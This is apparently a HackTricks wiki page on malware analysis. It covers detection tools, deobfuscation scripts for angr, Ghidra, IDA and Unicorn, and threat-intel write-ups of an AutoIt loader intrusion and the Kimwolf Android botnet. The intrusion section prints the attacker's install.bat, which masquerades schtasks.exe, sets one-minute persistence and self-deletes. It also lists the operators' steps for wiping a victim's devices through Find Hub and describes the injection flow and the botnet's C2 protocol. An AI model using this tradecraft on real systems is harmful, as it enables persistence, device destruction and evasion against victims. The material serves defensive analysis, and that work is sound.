# Malware Analysis

{{#include ../../banners/hacktricks-training.md}}

## Forensics CheatSheets

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Online Services

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Offline Antivirus and Detection Tools

### Yara

#### Install

```bash
sudo apt-get install -y yara
```

#### Prepare rules

Use this script to download and merge all the yara malware rules from github: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Create the _**rules**_ directory and execute it. This will create a file called _**malware_rules.yar**_ which contains all the yara rules for malware.

```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```

#### Scan

```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```

#### YaraGen: Check for malware and Create rules

You can use the tool [**YaraGen**](https://github.com/Neo23x0/yarGen) to generate yara rules from a binary. Check out these tutorials: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)

```bash
 python3 yarGen.py --update
 python3.exe yarGen.py --excludegood -m  ../../mals/
```

### ClamAV

#### Install

```
sudo apt-get install -y clamav
```

#### Scan

```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```

### [Capa](https://github.com/mandiant/capa)

**Capa** detects potentially malicious **capabilities** in executables: PE, ELF, .NET. So it will find things such as Att\&ck tactics, or suspicious capabilities such as:

- check for OutputDebugString error
- run as a service
- create process

Get it int he [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC means Indicator Of Compromise. An IOC is a set of **conditions that identify** some potentially unwanted software or confirmed **malware**. Blue Teams use this kind of definition to **search for this kind of malicious files** in their **systems** and **networks**.\
To share these definitions is very useful as when malware is identified in a computer and an IOC for that malware is created, other Blue Teams can use it to identify the malware faster.

A tool to create or modify IOCs is [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
You can use tools such as [**Redline**](https://www.fireeye.com/services/freeware/redline.html) to **search for defined IOCs in a device**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) is a scanner for Simple Indicators of Compromise.\
Detection is based on four detection methods:

```
1. File Name IOC
   Regex match on full file path/name

2. Yara Rule Check
   Yara signature matches on file data and process memory

3. Hash Check
   Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
   Compares process connection endpoints with C2 IOCs (new since version v.10)
```

### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) is a malware scanner for Linux released under the GNU GPLv2 license, that is designed around the threats faced in shared hosted environments. It uses threat data from network edge intrusion detection systems to extract malware that is actively being used in attacks and generates signatures for detection. In addition, threat data is also derived from user submissions with the LMD checkout feature and malware community resources.

### rkhunter

Tools like [**rkhunter**](http://rkhunter.sourceforge.net) can be used to check the filesystem for possible **rootkits** and malware.

```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```

### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) is a tool that will try to find obfuscated strings inside executables using different techniques.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper)checks some basic stuff inside the executable (binary data, entropy, URLs and IPs, some yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) is a tool that allows to get information of Windows executables such as imports, exports, headers, but also will check virus total and find potential Att\&ck techniques.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) is a tool to detect if a file is **encrypted** and also find **packers**.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI)is a Python script that uses a variety of **statistical methods** to detect **obfuscated** and **encrypted** content within text/script files. The intended purpose of NeoPI is to aid in the **detection of hidden web shell code**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) does its very best to detect **obfuscated**/**dodgy code** as well as files using **PHP** functions often used in **malwares**/webshells.

### Apple Binary Signatures

When checking some **malware sample** you should always **check the signature** of the binary as the **developer** that signed it may be already **related** with **malware.**

```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```

## Detection Techniques

### File Stacking

If you know that some folder containing the **files** of a web server was **last updated on some date**. **Check** the **date** all the **files** in the **web server were created and modified** and if any date is **suspicious**, check that file.

### Baselines

If the files of a folder **shouldn't have been modified**, you can calculate the **hash** of the **original files** of the folder and **compare** them with the **current** ones. Anything modified will be **suspicious**.

### Statistical Analysis

When the information is saved in logs you can **check statistics like how many times each file of a web server was accessed as a web shell might be one of the most**.

---

### Android in-app native telemetry (no root)

On Android, you can instrument native code inside the target app process by preloading a tiny logger library before other JNI libs initialize. This gives early visibility into native behavior without system-wide hooks or root. A popular approach is SoTap: drop libsotap.so for the right ABI into the APK and inject a System.loadLibrary("sotap") call early (e.g., static initializer or Application.onCreate), then collect logs from internal/external paths or Logcat fallback.

See the Android native reversing page for setup details and log paths:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Some Android malware and RASP-protected apps hide JNI method names and signatures by decoding them at runtime before calling RegisterNatives. When Frida/ptrace instrumentation is killed by anti-debug, you can still recover the plaintext offline by executing the in-binary decoder with angr and then pushing results back into Ghidra as comments.

Key idea: treat the decoder inside the .so as a callable function, execute it on the obfuscated byte blobs in .rodata, and concretize the output bytes up to the first \x00 (C-string terminator). Keep angr and Ghidra using the same image base to avoid address mismatches.

Workflow overview
- Triage in Ghidra: identify the decoder and its calling convention/arguments in JNI_OnLoad and RegisterNatives setup.
- Run angr (CPython3) to execute the decoder for each target string and dump results.
- Annotate in Ghidra: auto-comment decoded strings at each call site for fast JNI reconstruction.

Ghidra triage (JNI_OnLoad pattern)
- Apply JNI datatypes to JNI_OnLoad so Ghidra recognises JNINativeMethod structures.
- Typical JNINativeMethod per Oracle docs:

  ```c
  typedef struct {
      char *name;      // e.g., "nativeFoo"
      char *signature; // e.g., "()V", "()[B"
      void *fnPtr;     // native implementation address
  } JNINativeMethod;
  ```
- Look for calls to RegisterNatives. If the library constructs the name/signature with a local routine (e.g., FUN_00100e10) that references a static byte table (e.g., DAT_00100bf4) and takes parameters like (encoded_ptr, out_buf, length), that is an ideal target for offline execution.

angr setup (execute the decoder offline)
- Load the .so with the same base used in Ghidra (example: 0x00100000) and disable auto-loading of external libs to keep the state small.

<details>
<summary>angr setup and offline decoder execution</summary>

```python
import angr, json

project = angr.Project(
    '/path/to/libtarget.so',
    load_options={'main_opts': {'base_addr': 0x00100000}},
    auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
    # fresh blank state per evaluation
    st = project.factory.blank_state()
    outbuf = st.heap.allocate(length)
    call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
    ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
    rs = call.result_state
    raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
    return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```

</details>

- At scale, build a static map of call sites to the decoder’s arguments (encoded_ptr, size). Wrappers may hide arguments, so you may create this mapping manually from Ghidra xrefs if API recovery is noisy.

<details>
<summary>Batch decode multiple call sites with angr</summary>

```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
    0x00100f8c: (0x00100b81, 0x41),
    0x00100fa8: (0x00100bca, 0x04),
    0x00100fcc: (0x001007a0, 0x41),
    0x00100fe8: (0x00100933, 0x05),
    0x0010100c: (0x00100c62, 0x41),
    0x00101028: (0x00100c15, 0x16),
    0x00101050: (0x00100a49, 0x101),
    0x00100cf4: (0x00100821, 0x11),
    0x00101170: (0x00100940, 0x101),
    0x001011cc: (0x0010084e, 0x13),
    0x00101334: (0x001007e9, 0x0f),
    0x00101478: (0x0010087d, 0x15),
    0x001014f8: (0x00100800, 0x19),
    0x001015e8: (0x001008e6, 0x27),
    0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
                for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
    json.dump(decoded_map, f, indent=2)
```

</details>

Annotate call sites in Ghidra
Option A: Jython-only comment writer (use a pre-computed JSON)
- Since angr requires CPython3, keep deobfuscation and annotation separated. First run the angr script above to produce decoded_strings.json. Then run this Jython GhidraScript to write PRE_COMMENTs at each call site (and include the caller function name for context):

<details>
<summary>Ghidra Jython script to annotate decoded JNI strings</summary>

```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
    if ref.getReferenceType().isCall():
        from_addr = ref.getFromAddress()
        fn = fm.getFunctionContaining(from_addr)
        if fn:
            callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
    cs = int(k_hex, 16)
    site = toAddr(cs)
    caller = callsite_to_fn.get(cs, None)
    text = s if caller is None else '%s @ %s' % (s, caller)
    currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```

</details>

Option B: Single CPython script via pyhidra/ghidra_bridge
- Alternatively, use pyhidra or ghidra_bridge to drive Ghidra’s API from the same CPython process running angr. This allows calling decode_string() and immediately setting PRE_COMMENTs without an intermediate file. The logic mirrors the Jython script: build callsite→function map via ReferenceManager, decode with angr, and set comments.

Why this works and when to use it
- Offline execution sidesteps RASP/anti-debug: no ptrace, no Frida hooks required to recover strings.
- Keeping Ghidra and angr base_addr aligned (e.g., 0x00100000) ensures that function/data addresses match across tools.
- Repeatable recipe for decoders: treat the transform as a pure function, allocate an output buffer in a fresh state, call it with (encoded_ptr, out_ptr, len), then concretize via state.solver.eval and parse C-strings up to \x00.

Notes and pitfalls
- Respect the target ABI/calling convention. angr.factory.callable picks one based on arch; if arguments look shifted, specify cc explicitly.
- If the decoder expects zeroed output buffers, initialize outbuf with zeros in the state before the call.
- For position-independent Android .so, always supply base_addr so addresses in angr match those seen in Ghidra.
- Use currentProgram.getReferenceManager() to enumerate call-xrefs even if the app wraps the decoder behind thin stubs.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Deobfuscating Dynamic Control-Flow (JMP/CALL RAX Dispatchers)

Modern malware families heavily abuse Control-Flow Graph (CFG) obfuscation: instead of a direct jump/call they compute the destination at run-time and execute a `jmp rax` or `call rax`.  A small *dispatcher* (typically nine instructions) sets the final target depending on the CPU `ZF`/`CF` flags, completely breaking static CFG recovery.

The technique – showcased by the SLOW#TEMPEST loader – can be defeated with a three-step workflow that only relies on IDAPython and the Unicorn CPU emulator.

### 1. Locate every indirect jump / call

```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
    mnem = idc.print_insn_mnem(ea)
    if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
        print(f"[+] Dispatcher found @ {ea:X}")
```

### 2. Extract the dispatcher byte-code

```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
    s = jmp_ea
    for _ in range(count):
        s = idc.prev_head(s, 0)
    return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```

### 3. Emulate it twice with Unicorn

```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
    BASE = 0x1000
    mu = Uc(UC_ARCH_X86, UC_MODE_64)
    mu.mem_map(BASE, 0x1000)
    mu.mem_write(BASE, code)
    mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
    mu.reg_write(UC_X86_REG_RAX, 0)
    mu.emu_start(BASE, BASE+len(code))
    return mu.reg_read(UC_X86_REG_RAX)
```

Run `run(code,0,0)` and `run(code,1,1)` to obtain the *false* and *true* branch targets.

### 4. Patch back a direct jump / call

```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
    op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
    disp = target - (ea + 5) & 0xFFFFFFFF
    ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```

After patching, force IDA to re-analyse the function so the full CFG and Hex-Rays output are restored:

```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```

### 5. Label indirect API calls

Once the real destination of every `call rax` is known you can tell IDA what it is so parameter types & variable names are recovered automatically:

```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```

### Practical benefits

* Restores the real CFG → decompilation goes from *10* lines to thousands.
* Enables string-cross-reference & xrefs, making behaviour reconstruction trivial.
* Scripts are reusable: drop them into any loader protected by the same trick.

---

## AutoIt-based loaders: .a3x decryption, Task Scheduler masquerade and RAT injection

This intrusion pattern chains a signed MSI, AutoIt loaders compiled to .a3x, and a Task Scheduler job masquerading as a benign app.

### MSI → custom actions → AutoIt orchestrator

Process tree and commands executed by the MSI custom actions:

- MsiExec.exe → cmd.exe to run install.bat
- WScript.exe to show a decoy error dialog

```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```

install.bat (drops loader, sets persistence, self-cleans):

```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
  & hwpviewer /delete /tn "IoKlTr" /f ^
  & hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```

error.vbs (user decoy):

```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
    "설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
    vbCritical, "언어팩 오류"
```

Key artifacts and masquerade:
- Drops AutoIt3.exe and IoKlTr.au3 to C:\Users\Public\Music
- Copies schtasks.exe to hwpviewer.exe (masquerades as Hangul Word Processor viewer)
- Creates a scheduled task "IoKlTr" that runs every 1 minute
- Startup LNK seen as Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Stages modules under %APPDATA%\Google\Browser\ subfolders containing `adb` or `adv` and starts them via autoit.vbs/install.bat helpers

Forensic triage tips:
- schtasks enumeration: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Look for renamed copies of schtasks.exe co-located with Task XML: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Common paths: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Correlate process creation: AutoIt3.exe spawning legitimate Windows binaries (e.g., cleanmgr.exe, hncfinder.exe)

### AutoIt loaders and .a3x payload decryption → injection

- AutoIt modules are compiled with `#AutoIt3Wrapper_Outfile_type=a3x` and decrypt embedded payloads before injecting into benign processes.
- Observed families: QuasarRAT (injected into hncfinder.exe) and RftRAT/RFTServer (injected into cleanmgr.exe), as well as RemcosRAT modules (`Remcos\RunBinary.a3x`).
- Decryption pattern: derive an AES key via HMAC, decrypt the embedded blob, then inject the plaintext module.

Generic decryption skeleton (exact HMAC input/algorithm is family-specific):

```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
    # Example: HMAC-SHA256 → first 16/32 bytes as AES key
    return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
    return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```

Common injection flow (CreateRemoteThread-style):
- CreateProcess (suspended) of the target host (e.g., cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory with decrypted module/shellcode
- CreateRemoteThread or QueueUserAPC to execute payload

Hunting ideas
- AutoIt3.exe parented by MsiExec.exe or WScript.exe spawning system utilities
- Files with `.a3x` extensions or AutoIt script runners under public/user-writable paths
- Suspicious scheduled tasks executing AutoIt3.exe or binaries not signed by Microsoft, with minute-level triggers

### Account-takeover abuse of Android Find My Device (Find Hub)

During the Windows intrusion, operators used stolen Google credentials to repeatedly wipe the victim’s Android devices, suppressing notifications while they expanded access via the victim’s logged-in desktop messenger.

Operator steps (from a logged-in browser session):
- Review Google Account → Security → Your devices; follow Find My Phone → Find Hub (https://www.google.com/android/find)
- Select device → re-enter Google password → issue "Erase device" (factory reset); repeat to delay recovery
- Optional: clear alert e-mails in the linked mailbox (e.g., Naver) to hide security notifications

## AdaptixC2: Configuration Extraction and TTPs

See the dedicated page:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## Kimwolf Android Botnet Tradecraft

### APK loader & native ELF execution on TV boxes
- Malicious APKs such as `com.n2.systemservice06*` ship a statically linked ARM ELF inside `res/raw` (e.g. `R.raw.libniggakernel`). A `BOOT_COMPLETED` receiver runs at startup, extracts the raw resource to the app sandbox (e.g. `/data/data/<pkg>/niggakernel`), makes it executable and invokes it with `su`.
- Many Android TV boxes/tablets ship pre-rooted images or world-writable `su`, so the loader reliably boots the ELF with UID 0 even without an exploit chain. Persistence comes “for free” because the receiver relaunches after every reboot or app restart.
- Reverse engineers hunting for this pattern can diff `AndroidManifest.xml` for hidden boot receivers plus code that references `Resources.openRawResource` → `FileOutputStream` → `Runtime.getRuntime().exec("su")`. Once the ELF is dropped, triage it as a Linux userland backdoor (Kimwolf is UPX-packed, stripped, statically linked, 32-bit ARM EABI5).

### Runtime mutexes & masquerading IOCs
- Upon start, Kimwolf binds an **abstract UNIX domain socket** such as `@niggaboxv4`/`@niggaboxv5`. Existing sockets force an exit, so the socket name works as both a mutex and a forensic artifact.
- The process title is overwritten with service-looking names (`netd_services`, `tv_helper`, etc.) to blend into Android process listings. Host-based detections can alert on these names combined with the mutex socket.

### Stack XOR string decoding with ARM NEON + flare_emu
- Sensitive strings (C2 domains, resolvers, DoT endpoints) are pushed onto the stack in encrypted 8-byte blocks and decoded in-place via `VEOR Qx, Qx, Qy` (`veorq_s64`). Analysts can script **flare_emu** to catch the decrypted pointer each time the decryptor hands it to the caller:
```python
import flare_emu

eh = flare_emu.EmuHelper()

def hook(eh, addr, argv, _):
    if eh.isValidEmuPtr(argv[1]):
        print(hex(addr), eh.getEmuString(argv[1]))

eh.iterate(0x8F00, hook)  # sub_8F00 consumes the plaintext R1 argument
```
- Searching for `VEOR Q8, Q8, Q9` / `veorq_s64` sequences and emulating their ranges mass-dumps every decrypted string, bypassing the stack-only lifetime of the plaintext.

### DNS-over-TLS resolution plus XOR IP derivation
- All Kimwolf variants resolve C2 domains by speaking **DNS-over-TLS (TCP/853)** directly with Google (8.8.8.8) or Cloudflare (1.1.1.1), defeating plain DNS logging or hijacking.
- v4 bots simply use the returned IPv4 A record. v5 bots treat the A record as a 32-bit integer, swap its endianness, XOR it with the constant `0x00ce0491`, then flip the endianness back to obtain the real C2 IP. CyberChef recipe: Change IP format → swap endianness per 4-byte chunk → XOR with `00 ce 04 91` → convert back to dotted decimal.

### ENS / EtherHiding fallback
- Later builds add an ENS domain (`pawsatyou.eth`) whose resolver text key `"lol"` stores a benign-looking IPv6 (`fed0:5dec:...:1be7:8599`).
- The bot grabs the last four bytes (`1b e7 85 99`), XORs them with `0x93141715`, and interprets the result as an IPv4 C2 (`136.243.146.140`). Updating the ENS text record instantly rotates downstream C2s via the blockchain without touching DNS.

### TLS + ECDSA authenticated command channel
- Traffic is encapsulated in wolfSSL with a custom framed protocol:
```go
struct Header {
    Magic    [4]byte // e.g. "DPRK", "FD9177FF", "AD216CD4"
    Reserved uint8   // 0x01
    MsgType  uint8   // verb
    MsgID    uint32
    BodyLen  uint32
    CRC32    uint32
}
```
- Bootstrap: the bot sends two empty `MsgType=0 (register)` headers. The C2 replies with `MsgType=1 (verify)` containing a random challenge plus an ASN.1 DER **ECDSA** signature. Bots verify it against an embedded SubjectPublicKeyInfo blob; failures terminate the session, preventing hijacked/sinkholed C2 nodes from tasking the fleet.
- Once verified, the bot sends a `MsgType=0` body carrying the operator-defined **group string** (e.g. `android-postboot-rt`). If the group is enabled, the C2 responds with `MsgType=2 (confirm)`, after which tasking (MsgType 5–12) begins.
- Supported verbs include SOCKS-style TCP/UDP proxying (residential proxy monetization), reverse shell / single command exec, file read/write, and **Mirai-compatible DDoSBody** payloads (same `AtkType`, `Duration`, `Targets[]`, `Flags[]` layout).

## References

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- Kimwolf Android TV Botnet: ENS-Based C2 Evasion, TLS+ECDSA C2 Protocol, and Large-Scale Proxy/DDoS Operations – [blog.xlab.qianxin.com](https://blog.xlab.qianxin.com/kimwolf-botnet-en/)

{{#include ../../banners/hacktricks-training.md}}